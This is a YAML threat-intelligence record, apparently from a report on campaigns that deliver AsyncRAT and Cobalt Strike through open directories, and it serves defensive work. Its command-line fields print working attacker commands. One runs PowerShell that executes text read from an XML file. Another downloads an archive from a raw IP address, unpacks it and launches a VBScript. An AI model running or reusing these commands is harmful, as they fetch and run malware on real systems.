title: 'Gateway to Intrusion: Malware Delivery Via Open Directories'
description: Threat actors leverage open directories to deliver AsyncRAT and Cobalt
  Strike payloads, using VBScript with BITS transfer and a Python executable with
  Fernet-encrypted shellcode to compromise systems.
attribution: ''
malware_families:
- AsyncRAT
- Cobalt Strike
- Supershell
cves: []
ttps:
  processes:
  - powershell.exe
  - 1.exe
  command_lines:
  - powershell -command ""[xml]$xmldoc = Get-Content 'C:\Users\Public\temp.xml'; $comm=
    $xmldoc.command.a.execute; Invoke-Expression command""
  - Start-BitsTransfer -Source "http://207.32.217.21:444/f+jpg" -Destination "C:\Users\Public\ben.zip";
    Expand-Archive -Path "C:\Users\Public\ben.zip" -DestinationPath "C:\Users\Public\"
    -Force; Start "C:\Users\Public\Webcentral.vbs"; Remove-Item -Path "C:\Users\Public\ben.zip"
    -Force
  powershell:
  - Start-BitsTransfer -Source "http://207.32.217.21:444/f+jpg" -Destination "C:\Users\Public\ben.zip";
    Expand-Archive -Path "C:\Users\Public\ben.zip" -DestinationPath "C:\Users\Public\"
    -Force; Start "C:\Users\Public\Webcentral.vbs"; Remove-Item -Path "C:\Users\Public\ben.zip"
    -Force
